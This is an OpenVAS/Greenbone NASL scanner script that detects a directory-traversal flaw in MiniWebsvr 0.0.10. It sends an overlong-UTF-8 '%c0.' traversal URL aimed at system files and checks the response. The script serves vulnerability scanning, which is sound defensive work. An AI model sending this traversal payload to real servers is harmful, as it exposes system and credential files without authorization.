if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100638" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-05-14 12:04:31 +0200 (Fri, 14 May 2010)" );
	script_bugtraq_id( 40133 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "MiniWebsvr URI Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/40133" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web Servers" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_mandatory_keys( "MiniWebSvr/banner" );
	script_require_ports( "Services/www", 8080 );
	script_tag( name: "summary", value: "MiniWebsvr is prone to a directory-traversal vulnerability because it
  fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this issue will allow an attacker to traverse through
  arbitrary directories and gain access to sensitive information." );
	script_tag( name: "affected", value: "MiniWebsvr 0.0.10 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "MiniWebSvr" )){
	exit( 0 );
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = "/c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./" + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

